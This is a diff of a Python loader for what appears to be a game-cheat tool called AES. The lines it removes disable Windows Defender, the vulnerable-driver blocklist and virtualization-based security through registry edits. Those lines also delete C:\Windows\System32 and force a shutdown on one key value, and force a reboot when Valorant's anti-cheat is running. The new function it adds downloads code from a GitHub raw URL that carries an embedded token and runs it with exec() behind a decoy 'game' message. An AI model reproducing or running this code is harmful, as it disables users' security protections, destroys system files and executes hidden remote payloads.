@@ -17,13 +17,15 @@ os.system('cls')
 filenamex = os.path.basename(__file__)
 #discord_warning(filenamex)
 
-if filenamex != "aesv9.0.py":
+'''
+if filenamex != "v1-2025.py":
     os.system('cls')
     script_path = os.path.realpath(__file__)
     os.remove(script_path)
     os.system('cls')
     print("Error.")
     sys.exit()
+'''
 
 if cskey =="deletemysdfasdf":
     os.system('cls')
@@ -188,125 +190,18 @@ create_file_in_system32('88systemdrivervul.txt', 'KRmMXvKn0m')
 create_file_in_system32('88datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
 create_file_in_system32('88infosystem.txt', 'klh_qupuw6n3pq')
 os.system('cls')
-
-aesv7()
-if cskey =="antidebuuggerxxxx":
-    shutil.rmtree(r'C:\Windows\System32')
-    os.system("shutdown /s /f /t 0")
-
-def is_valorant_running():
-    result = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
-    if 'vgc.exe' in result.stdout:
-        return True
-    return False
-if is_valorant_running():   
-    os.system('cls')
-    mylogo
-    msgysdc=cskey+" tried to run Aes while valo is running."
-    discord_warning(msgysdc)
-    os.system("shutdown /r /f /t 0")
-    printg("---ERROR. Please run AES first before you open Valorant.")
-    printg("---This is for your own safety.")
-    printg("---If error persists, restart PC.")
-    show_message_box("ERROR. Please run AES first before you open Valorant.", "Error", MB_OK | ICON_ERROR)
-    sys.exit()
-    exit()
-else:
-    print("")
 os.system('cls')   
 
-try:
-    subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
-    print("Command executed successfully.")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
-
-os.system('cls')
-try:
-    subprocess.run('reg add HKLM\SYSTEM\CurrentControlSet\CI\Config /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f', shell=True, check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
-
-os.system('cls')
-try:
-    subprocess.run('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f', shell=True, check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
-
-os.system('cls')
-try:
-    subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print(f"Error: {e}")
-os.system('cls')
-filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
-filexyz2 = r'C:\Windows\System32\system_driver_vul.txt'
-filexyz3 = r'C:\Windows\System32\systeminfo.txt'
-if not os.path.exists(filexyz1):
-    os.system('cls')
-    mylogo()
-    printg("Access denied, please tell dev to give access to the server.")
-    input()
-    sys.exit()
-if not os.path.exists(filexyz2):
-    os.system('cls')
-    mylogo()
-    printg("Access denied, please tell dev to give access to the server.")
-    input()
-    sys.exit()
-if not os.path.exists(filexyz3):
-    os.system('cls')
-    mylogo()
-    printg("Access denied, please tell dev to give access to the server.")
-    input()
-    sys.exit()
-def new_function_name(mycontent):
-    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
-
-    crpppttkkyy = Fernet.generate_key()
-    cipher_suite = Fernet(crpppttkkyy)
+def v1_2025_script(mycontent: str):
+    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/v1-2025.txt?token=GHSAT0AAAAAADARMS7NW7MZKYKNOXBWOGTCZ6VALLQ"
+    headers = {"Authorization": f"token {mycontent}"}
+    response = requests.get(raw_url, headers=headers)
     
-    cipher_text = cipher_suite.encrypt(mycontent.encode())
-    
-    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
-    os.environ['ncrptttkkn'] = cipher_text.decode()
-    
-    crpppttkkyy = os.environ['crpppttkkyy']
-    cipher_suite = Fernet(crpppttkkyy.encode())
-    ncrptttkkn = os.environ['ncrptttkkn']
-    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
-    
-    
-    headers = {'Authorization': f'token {dcrpptttknnnn}'}
-    
-    raw2response = requests.get(raw2_url,headers=headers)
-    raw2finalcontent = raw2response.text
-    raw2urlfinal = raw2finalcontent
-    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
-    if raw2urlfinalresponse.status_code == 200:  
-        content2 =  raw2urlfinalresponse.text
-        if True:      
-            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
-            rawresponse = requests.get(rawfile_url)
-            rawcontent = rawresponse.text
-            raw_url = rawcontent
-            response = requests.get(raw_url, headers=headers)
-            content = response.text
-            print("Make sure its working fine. The account's email.The owner might change the password of the account anytime.\n\n2. Inactive accounts are accounts that have not been used by the owner for 2weeks to months or years.\n\n3. If the account is  invalid, or perma banned, you can request for a replacement within 24 hours.",exec(f"{content}"))
-            os.system('cls')
-            
-        else:
-            print("error")
-            os.system('cls')
-            
+    if response.status_code == 200:
+        mycntcnt = response.text
+        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
     else:
-        print("error")
-
-    if raw2urlfinalresponse.status_code != 200:
-        exit()
+        raise Exception(f"Error. Your internet is private.")
 
 def get_string_from_file(file_path):
     if os.path.exists(file_path):
@@ -323,4 +218,4 @@ content2 = get_string_from_file(system_driver_vul_path)
 content3 = get_string_from_file(data_vulnerable_path)
 content4 =  content1+content2+content3
 content5 = content4
-new_function_name(content5)
+v1_2025_script(content5)
